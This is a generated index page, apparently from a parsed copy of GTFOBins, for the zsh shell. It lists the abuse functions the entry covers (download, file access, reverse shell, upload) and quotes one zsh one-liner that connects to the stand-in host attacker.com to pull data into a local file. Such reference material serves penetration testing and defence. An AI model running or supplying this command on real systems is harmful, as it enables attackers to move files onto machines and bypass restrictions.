---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# zsh

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `zsh` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/zsh` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

GTFOBins entry for zsh covering download, file-read, file-write, inherit, reverse-shell, shell, upload.

## Fast Retrieval

- Platform: `linux`
- Command page: [commands](../../commands/linux/zsh.md)
- Source verification: [source record](../../sources/gtfobins/zsh.md)

## Aliases

- `zsh`

## Source Verification

[source record](../../sources/gtfobins/zsh.md)

## Evidence Excerpt

```text
_body: ''
_name: zsh
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/zsh
functions:
download:
- binary: false
code: zsh -c 'zmodload zsh/net/tcp;ztcp attacker.com 12345;echo -n "$(<&$REPLY)" >/path/to/output-file'
contexts:
```
